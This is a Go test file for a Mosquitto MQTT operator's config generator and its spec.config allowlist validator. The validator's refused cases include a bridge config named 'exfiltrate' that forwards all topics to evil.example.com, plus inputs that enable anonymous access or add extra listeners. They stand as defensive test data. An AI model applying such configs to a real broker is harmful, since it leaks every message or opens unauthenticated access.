package builder

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"

	mkov1 "github.com/guided-traffic/mosquitto-operator/api/v1"
	"github.com/guided-traffic/mosquitto-operator/internal/common"
)

// newMosquitto returns a minimal CR the builder tests start from.
func newMosquitto(mutators ...func(*mkov1.Mosquitto)) *mkov1.Mosquitto {
	m := &mkov1.Mosquitto{
		ObjectMeta: metav1.ObjectMeta{Name: "broker", Namespace: "messaging"},
		Spec:       mkov1.MosquittoSpec{Replicas: 1},
	}
	for _, mutate := range mutators {
		mutate(m)
	}
	return m
}

func withTLS(secret string) func(*mkov1.Mosquitto) {
	return func(m *mkov1.Mosquitto) { m.Spec.TLS = &mkov1.MosquittoTLS{SecretName: secret} }
}

func withMetrics() func(*mkov1.Mosquitto) {
	return func(m *mkov1.Mosquitto) { m.Spec.Metrics = &mkov1.MosquittoMetrics{Enabled: true} }
}

func withStorage(size string) func(*mkov1.Mosquitto) {
	return func(m *mkov1.Mosquitto) { m.Spec.Storage = &mkov1.MosquittoStorage{Size: size} }
}

func TestConfigMapName(t *testing.T) {
	assert.Equal(t, "broker-config", ConfigMapName(newMosquitto()))
}

func TestBrokerPortFollowsTLS(t *testing.T) {
	tests := []struct {
		name     string
		m        *mkov1.Mosquitto
		wantPort int32
		wantName string
	}{
		{"plain", newMosquitto(), MQTTPort, MQTTPortName},
		{"tls", newMosquitto(withTLS("broker-tls")), MQTTSPort, MQTTSPortName},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			assert.Equal(t, tt.wantPort, BrokerPort(tt.m))
			assert.Equal(t, tt.wantName, BrokerPortName(tt.m))
		})
	}
}

// wantedListenerBlock is the generated listener, in order: the listener line,
// the TLS files when TLS is on, no anonymous access, the client ID bound to the
// username, both plugins bound (ADR 0008 D13, D14).
func wantedListenerBlock(tls bool) string {
	if tls {
		return "listener 8883\ncertfile /mosquitto/tls/tls.crt\nkeyfile /mosquitto/tls/tls.key\n" +
			"listener_allow_anonymous false\n" + bindingTail
	}
	return "listener 1883\nlistener_allow_anonymous false\n" + bindingTail
}

const bindingTail = "# The client ID is the username: no client can take over another client's\n" +
	"# session, and one username holds one connection.\n" +
	"use_username_as_clientid true\nplugin_use pwfile\nplugin_use aclfile\n"

// TestGenerateMosquittoConf_RequiresALogin is ADR 0008 D13 and D14 in the
// generated file of each shape: both file plugins loaded and bound to the one
// listener, no anonymous access anywhere, the client ID bound to the username.
func TestGenerateMosquittoConf_RequiresALogin(t *testing.T) {
	for _, tls := range []bool{false, true} {
		m := newMosquitto()
		if tls {
			m = newMosquitto(withTLS("broker-tls"))
		}
		conf := GenerateMosquittoConf(m)

		assert.Contains(t, conf, "plugin_load pwfile /usr/lib/mosquitto_password_file.so\n"+
			"plugin_opt_password_file /mosquitto/auth/passwd\n"+
			"plugin_load aclfile /usr/lib/mosquitto_acl_file.so\n"+
			"plugin_opt_acl_file /mosquitto/auth/acl\n")
		assert.Contains(t, conf, wantedListenerBlock(tls))
		assert.NotContains(t, conf, "allow_anonymous true", "there is no opt-in to anonymous access")
		assert.Equal(t, 1, strings.Count(conf, "\nlistener "), "exactly one listener")
		assert.Less(t, strings.Index(conf, "plugin_load"), strings.Index(conf, "\nlistener "),
			"the plugins are declared before the listener that binds them")
		assert.NotContains(t, conf, "\npassword_file ", "the 2.1 plugin form, never the deprecated option (ADR 0007 D7)")
		assert.NotContains(t, conf, "per_listener_settings")
	}
}

func TestGenerateMosquittoConf_PlainListener(t *testing.T) {
	conf := GenerateMosquittoConf(newMosquitto())

	assert.Contains(t, conf, "listener 1883")
	assert.NotContains(t, conf, "listener 8883")
	assert.NotContains(t, conf, "certfile")
	assert.NotContains(t, conf, "keyfile")
	assert.Contains(t, conf, "persistence true")
	assert.Contains(t, conf, "persistence_location /mosquitto/data/")
	assert.Contains(t, conf, "log_dest stdout")
}

// TestGenerateMosquittoConf_TLSReplacesThePlainListener pins the documented
// behaviour of spec.tls: it switches the listener, it does not add a second one,
// so enabling TLS closes the plaintext port.
func TestGenerateMosquittoConf_TLSReplacesThePlainListener(t *testing.T) {
	conf := GenerateMosquittoConf(newMosquitto(withTLS("broker-tls")))

	assert.Contains(t, conf, "listener 8883")
	assert.NotContains(t, conf, "listener 1883")
	assert.Contains(t, conf, "certfile /mosquitto/tls/tls.crt")
	assert.Contains(t, conf, "keyfile /mosquitto/tls/tls.key")
}

func TestGenerateMosquittoConf_SpecConfigIsAppendedLast(t *testing.T) {
	tests := []struct {
		name        string
		config      string
		wantContain string
		wantSection bool
	}{
		{"empty config adds no section", "", "", false},
		{"whitespace only adds no section", "   \n\t\n", "", false},
		{"directives are appended", "max_queued_messages 500\nmax_inflight_messages 20",
			"max_queued_messages 500\nmax_inflight_messages 20", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			m := newMosquitto(func(m *mkov1.Mosquitto) { m.Spec.Config = tt.config })
			conf := GenerateMosquittoConf(m)

			if !tt.wantSection {
				assert.NotContains(t, conf, "spec.config, appended")
				return
			}

			assert.Contains(t, conf, "spec.config, appended after every line passed the allowlist.")
			assert.Contains(t, conf, tt.wantContain)
			assert.Greater(t, strings.Index(conf, tt.wantContain), strings.Index(conf, "plugin_use aclfile"),
				"spec.config comes after the listener block, so a listener option in it tunes the generated listener")
		})
	}
}

// TestValidateSpecConfig is ADR 0008 D15: an allowlist, checked line by line,
// because one overlooked directive opens an anonymous listener beside the
// generated one (broker-behaviour.md M15).
func TestValidateSpecConfig(t *testing.T) {
	refused := []struct{ name, config, wantLine string }{
		{"a second listener", "max_keepalive 60\nlistener 1884\nlistener_allow_anonymous true", "line 2"},
		{"anonymous access, global", "allow_anonymous true", "line 1"},
		{"anonymous access, listener-scoped", "listener_allow_anonymous true", "line 1"},
		{"a bridge", "connection exfiltrate\naddress evil.example.com:1883\ntopic # out", "line 1"},
		{"a plugin", "plugin_load dynsec /usr/lib/mosquitto_dynamic_security.so", "line 1"},
		{"a global plugin", "global_plugin /usr/lib/mosquitto_dynamic_security.so", "line 1"},
		{"the deprecated password file", "password_file /tmp/passwd", "line 1"},
		{"per-listener settings", "per_listener_settings true", "line 1"},
		{"an include", "include_dir /tmp", "line 1"},
		{"the client-ID binding switched off", "use_username_as_clientid false", "line 1"},
		{"a mount point that rewrites every topic under the ACLs", "mount_point other/", "line 1"},
		{"a port", "port 1884", "line 1"},
		{"a directive in another case", "MAX_KEEPALIVE 60", "line 1"},
		{"the replaced size limit", "message_size_limit 1000", "line 1"},
	}
	for _, tt := range refused {
		t.Run("refused: "+tt.name, func(t *testing.T) {
			err := ValidateSpecConfig(newMosquitto(func(m *mkov1.Mosquitto) { m.Spec.Config = tt.config }))
			require.Error(t, err)
			assert.Contains(t, err.Error(), "spec.config "+tt.wantLine)
		})
	}

	accepted := []string{
		"",
		"# a comment\n\n   \n",
		"max_keepalive 120\nmax_queued_messages 1000\n  log_type debug\n# tuned for zigbee2mqtt",
		"max_connections 50\nmax_qos 1",
	}
	for _, config := range accepted {
		assert.NoError(t, ValidateSpecConfig(newMosquitto(func(m *mkov1.Mosquitto) { m.Spec.Config = config })), "%q", config)
	}

	for directive := range AllowedConfigDirectives {
		assert.NotContains(t, []string{"listener", "port", "allow_anonymous", "listener_allow_anonymous",
			"plugin", "plugin_load", "plugin_use", "global_plugin", "password_file", "acl_file",
			"per_listener_settings", "include_dir", "use_username_as_clientid", "connection", "address", "topic"},
			directive, "ADR 0008 D15 names %q as never allowed", directive)
	}
}

func TestBuildConfigMap(t *testing.T) {
	m := newMosquitto()
	cm := BuildConfigMap(m)

	assert.Equal(t, "broker-config", cm.Name)
	assert.Equal(t, "messaging", cm.Namespace)
	assert.Equal(t, common.BaseLabels(m, DefaultImage), cm.Labels)

	require.Contains(t, cm.Data, ConfigKey)
	assert.Equal(t, GenerateMosquittoConf(m), cm.Data[ConfigKey])
}

func TestBuildConfigMapLabelsFollowTheResolvedImage(t *testing.T) {
	m := newMosquitto(func(m *mkov1.Mosquitto) { m.Spec.Image = "eclipse-mosquitto:2.1.0" })

	assert.Equal(t, "2.1.0", BuildConfigMap(m).Labels[common.LabelVersion])
}

// TestGenerateMosquittoConf_StatesTwoDefaults is ADR 0002 D7 with M29: the
// $SYS interval and the packet limit are written out, before spec.config, so a
// line there still overrides them.
func TestGenerateMosquittoConf_StatesTwoDefaults(t *testing.T) {
	conf := GenerateMosquittoConf(newMosquitto(func(m *mkov1.Mosquitto) { m.Spec.Config = "sys_interval 30" }))
	assert.Contains(t, conf, "\nsys_interval 10\n")
	assert.Contains(t, conf, "\nmax_packet_size 2000000\n")
	assert.Less(t, strings.Index(conf, "sys_interval 10"), strings.Index(conf, "sys_interval 30"),
		"the generated value comes first, so spec.config wins")
}
